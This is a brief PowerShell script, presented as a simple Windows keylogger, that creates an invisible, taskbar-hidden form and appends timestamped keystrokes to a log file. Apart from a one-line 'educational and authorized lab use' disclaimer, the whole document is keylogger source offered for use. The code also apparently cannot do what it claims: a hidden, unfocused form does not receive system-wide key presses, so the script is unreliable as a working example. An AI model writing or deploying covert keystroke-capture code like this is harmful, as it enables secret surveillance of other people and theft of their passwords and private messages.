<#
.SYNOPSIS
    Simple keylogger for Windows using PowerShell 7 and .NET.
.DESCRIPTION
    Logs keystrokes to a file with timestamps. For educational and authorized lab use only.
.NOTES
    Requires PowerShell 7+ and Windows OS.
#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$logFile = "keylog.txt"
$null = [System.Windows.Forms.Application]::EnableVisualStyles()

# Create a hidden form to capture keystrokes
$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Minimized'
$form.ShowInTaskbar = $false
$form.Opacity = 0

# KeyDown event handler
$form.Add_KeyDown({
    param($sender, $e)
    $key = $e.KeyCode.ToString()
    $timestamp = (Get-Date).ToString("o")
    Add-Content -Path $logFile -Value "$timestamp - $key"
})

Write-Host "[INFO] Keylogger started. Logging to '$logFile'. Close the PowerShell window to stop."

# Set focus and start capturing
$form.KeyPreview = $true
$form.Show()
[System.Windows.Forms.Application]::Run($form)